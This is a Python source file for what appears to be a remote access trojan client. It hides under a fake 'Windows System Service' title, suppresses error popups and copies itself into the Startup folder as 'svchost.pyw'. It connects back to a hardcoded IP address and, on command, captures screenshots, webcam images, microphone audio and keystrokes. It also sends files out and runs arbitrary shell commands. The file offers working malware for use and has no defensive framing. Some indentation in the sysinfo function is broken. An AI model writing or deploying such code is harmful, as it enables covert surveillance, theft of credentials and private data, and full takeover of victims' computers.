# FINAL STABLE CLIENT.PY - NOOR UL HASSAN (DEC 2025)
import os
import sys
import getpass
import shutil
import socket
import subprocess
import random
import platform
import uuid
from io import BytesIO

# === SILENT MODE + NO POPUPS + INNOCENT TITLE ===
try:
    os.system("title Windows System Service")  # looks legit in Task Manager
except:
    pass
import ctypes
ctypes.windll.kernel32.SetErrorMode(0x0002 | 0x0001 | 0x8007)  # suppress all error popups

# === AUTO PERSISTENCE (SURVIVES REBOOT) ===
def add_persistence():
    try:
        user = getpass.getuser()
        startup = f"C:\\Users\\{user}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
        dest = os.path.join(startup, "svchost.pyw")
        me = os.path.realpath(__file__)
        if not os.path.exists(dest):
            shutil.copyfile(me, dest)
    except:
        pass

add_persistence()

# === AUTO INSTALL DEPENDENCIES ===
def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", pkg, "--quiet"])

for module, pkg in [
    ("cv2", "opencv-python"),
    ("ImageGrab", "pillow"),
    ("sounddevice", "sounddevice"),
    ("wavio", "wavio"),
    ("scipy", "scipy"),
    ("Listener", "pynput")
]:
    try:
        __import__(module)
    except:
        install(pkg)

# === IMPORTS AFTER INSTALL ===
import cv2
from PIL import ImageGrab
import sounddevice as sd
import wavio
from pynput.keyboard import Listener

# === FEATURES ===
def screenshot(s):
    buf = BytesIO()
    ImageGrab.grab().save(buf, "PNG")
    buf.seek(0)
    while chunk := buf.read(1024):
        s.send(chunk)
    s.send(b"Sended")

def webcam_pic(s):
    cam = cv2.VideoCapture(0)
    ret, frame = cam.read()
    if ret:
        fn = f"{random.randint(100,999)}.png"
        cv2.imwrite(fn, frame)
        with open(fn, "rb") as f:
            while chunk := f.read(1024):
                s.send(chunk)
        s.send(b"Sended")
        os.remove(fn)
    cam.release()

def download(s):
    path = s.recv(1024).decode().strip()
    if os.path.exists(path):
        with open(path, "rb") as f:
            while chunk := f.read(1024):
                s.sendall(chunk)
        s.send(b"FILE_SENT")
    else:
        s.send(b"FILE_NOT_FOUND")

def upload(s, cmd):
    name = cmd[7:].strip()
    with open(name, "wb") as f:
        while True:
            data = s.recv(1024)
            if data.endswith(b"DONE"):
                f.write(data[:-4])
                break
            f.write(data)
    s.send(b"Upload completed")

def sysinfo(s):
    try:
        mac = ':'.join(f'{b:02x}' for b in uuid.getnode().to_bytes(6, 'big'))
        info = f"""
        [+] System Information
        OS       → {platform.system()} {platform.release()}
        Hostname → {platform.node()}
        User     → {getpass.getuser()}
        CPU      → {platform.processor()}
        MAC      → {mac}
        Path     → {os.getcwd()}
        """
            s.sendall(info.encode("utf-8"))
        except:
            s.sendall(b"[-] Error getting sysinfo")

def keylogger(s):
    def on_press(key):
        try:
            s.sendall(str(key).encode().replace(b"'", b"") + b"\n")
        except:
            pass
    Listener(on_press=on_press).start()
    s.send(b"Keylogger running...")

def mic_record(s):
    rec = sd.rec(int(10 * 44100), samplerate=44100, channels=2)
    sd.wait()
    wavio.write("t.wav", rec, 44100, sampwidth=2)
    with open("t.wav", "rb") as f:
        while chunk := f.read(1024):
            s.send(chunk)
    s.send(b"Sended")
    os.remove("t.wav")

def shell(s, cmd, ps=False):
    if cmd.lower().startswith("cd "):
        try:
            os.chdir(cmd[3:])
        except:
            pass
        s.sendall(f"\n{os.getcwd()}> ".encode())
        return
    proc = subprocess.Popen(
        ["powershell", "-c", cmd] if ps else cmd,
        shell=not ps, stdout=subprocess.PIPE, stderr=subprocess.PIPE
    )
    out = proc.stdout.read() + proc.stderr.read()
    s.sendall(out + f"\n{os.getcwd()}> ".encode())

# === CONNECTION LOOP (NEVER DIES) ===
def connect():
    while True:
        try:
            s = socket.socket()
            s.connect(("20.205.17.23", 1235))   # ← YOUR AZURE IP
            choice = s.recv(1024).decode()
            return s, choice
        except:
            import time
            time.sleep(7)

# === MAIN LOOP (RESTARTS ON ANY CRASH) ===
if __name__ == "__main__":
    while True:
        try:
            sock, shell_type = connect()
            while True:
                data = sock.recv(32000)
                if not data:
                    break
                cmd = data.decode(errors="ignore").strip()

                if cmd.startswith("ss"):
                    screenshot(sock)
                elif cmd.startswith("webcam"):
                    webcam_pic(sock)
                elif cmd.startswith("download "):
                    sock.sendall(cmd[9:].encode())
                    download(sock)
                elif cmd.startswith("upload "):
                    upload(sock, cmd)
                elif cmd == "sysinfo":
                    sysinfo(sock)
                elif cmd == "keylog":
                    keylogger(sock)
                elif cmd == "mic":
                    mic_record(sock)
                else:
                    shell(sock, cmd, shell_type == "PS")
        except:
            import time
            time.sleep(10)   # restart if anything crashes
